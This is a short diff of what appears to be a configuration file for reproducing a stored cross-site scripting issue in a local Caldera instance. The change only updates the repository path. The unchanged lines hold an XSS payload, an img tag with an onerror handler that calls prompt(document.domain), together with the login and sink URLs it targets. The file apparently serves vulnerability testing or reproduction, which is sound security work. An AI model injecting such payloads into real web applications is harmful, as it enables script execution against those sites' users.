@@ -9,4 +9,4 @@ login_url: "http://localhost:8888/login"
 sink_url: "http://localhost:8888/dh2cves2location.pathname?#home"
 payload: '''"><img src=x onerror=prompt(document.domain)>'
 image_path: "./images/StoredXSS"
-repo_path: "../caldera"
+repo_path: "../caldera-latest"
